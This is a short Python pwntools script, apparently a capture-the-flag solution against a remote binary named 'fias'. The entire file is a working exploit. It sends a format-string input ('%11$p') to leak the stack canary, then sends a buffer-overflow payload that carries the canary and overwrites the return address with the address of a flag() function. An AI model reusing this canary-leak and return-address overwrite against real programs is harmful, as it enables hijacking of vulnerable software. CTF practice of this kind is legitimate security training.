#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
binary = ELF('./fias')
print("flag(): %x\n" % binary.symbols['flag'])

#p = process('./fias')
p = remote('88.198.219.20', 56502)
p.recvuntil("Hi! What's your name?")
p.sendline('%11$p')
line = p.recvline()
addrs = line.decode().split(', ')[1][:-2].split('-')
canary = int(addrs[0], 16)
print("canary: %x\n" % canary)

p.recvuntil("Do YOU want to pet my canary?")
payload = b'B' * (25)
payload += p32(canary)
payload += p32(binary.symbols['flag']) * 4
p.sendline(payload)
p.stream()
